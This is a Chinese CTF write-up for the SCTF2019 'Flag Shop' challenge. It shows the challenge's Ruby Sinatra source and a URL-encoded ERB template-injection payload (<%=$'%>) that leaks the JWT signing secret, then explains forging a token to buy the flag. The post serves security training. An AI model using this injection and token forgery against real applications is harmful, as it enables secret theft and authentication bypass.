---
title: '[SCTF2019]Flag Shop'
date: 2024-08-03 17:17:00
tags: jwt
categories: 刷题笔记
---

### [SCTF2019]Flag Shop(jwt,Ruby)

我们通过页面可以发现，需要我们获得**1000000000000000000000000000**才能得到flag，我们考虑抓包

![image-20240803182745459](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408031827641.png)

获得了一串jwt

<!--more-->

我们进行解析

![image-20240803182829296](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408031828457.png)

我们可以伪造jwt来获得钱，但我们不知道密钥是什么，我们再找找有没有其他的信息

我们查看robots.txt,获得了源码

```
require 'sinatra'
require 'sinatra/cookies'
require 'sinatra/json'
require 'jwt'
require 'securerandom'
require 'erb'

set :public_folder, File.dirname(__FILE__) + '/static'

FLAGPRICE = 1000000000000000000000000000
ENV["SECRET"] = SecureRandom.hex(64)

configure do
  enable :logging
  file = File.new(File.dirname(__FILE__) + '/../log/http.log',"a+")
  file.sync = true
  use Rack::CommonLogger, file
end

get "/" do
  redirect '/shop', 302
end

get "/filebak" do
  content_type :text
  erb IO.binread __FILE__
end

get "/api/auth" do
  payload = { uid: SecureRandom.uuid , jkl: 20}
  auth = JWT.encode payload,ENV["SECRET"] , 'HS256'
  cookies[:auth] = auth
end

get "/api/info" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  json({uid: auth[0]["uid"],jkl: auth[0]["jkl"]})
end

get "/shop" do
  erb :shop
end

get "/work" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  auth = auth[0]
  unless params[:SECRET].nil?
    if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
      puts ENV["FLAG"]
    end
  end

  if params[:do] == "#{params[:name][0,7]} is working" then

    auth["jkl"] = auth["jkl"].to_i + SecureRandom.random_number(10)
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    ERB::new("<script>alert('#{params[:name][0,7]} working successfully!')</script>").result

  end
end

post "/shop" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }

  if auth[0]["jkl"] < FLAGPRICE then

    json({title: "error",message: "no enough jkl"})
  else

    auth << {flag: ENV["FLAG"]}
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    json({title: "success",message: "jkl is good thing"})
  end
end


def islogin
  if cookies[:auth].nil? then
    redirect to('/shop')
  end
end
```

通过代码审计，我们可以知道这段代码是用Ruby编写的一个基本的Web应用程序，使用了Sinatra框架

由此我们可以想到ruby模块注入

注入点在/work

```
  if params[:do] == "#{params[:name][0,7]} is working" then

    auth["jkl"] = auth["jkl"].to_i + SecureRandom.random_number(10)
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    ERB::new("<script>alert('#{params[:name][0,7]} working successfully!')</script>").result

  end

```

我们只要满足了这个`if params[:do] == "#{params[:name][0,7]} is working" then`，就会进行模板渲染

[【技术分享】手把手教你如何完成Ruby ERB模板注入](https://www.anquanke.com/post/id/86867)

但是这题有长度的限制，除去`<%=%>`，就只剩下2个字符可用了。可以用ruby的Ruby的预定义变量

[预定义变量](https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html)

我们利用$',最后一次成功匹配右边的字符串

```
<%=$'%>
```

payload

```
/work?SECRET=&name=<%=$'%>&do=<%=$'%> is working
```

为什么需要SECRET参数，是为了可以搜索SECRET参数内容，然后是<%=$'%>返回最后一次匹配的字符串是我们的密钥

但我们不能直接传入，需要进行一次url编码

```
?SECRET=&name=%3C%25%3D%24%27%25%3E&do=%3C%25%3D%24%27%25%3E%20is%20working
```

![image-20240803184633971](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408031846027.png)

得到密钥

我们构造jwt

![image-20240803184848101](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408031848154.png)

进行抓包上传

我们购买flag，进行抓包，将得到的jwt进行解密，就能得到flag了

![image-20240803185020909](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408031850965.png)
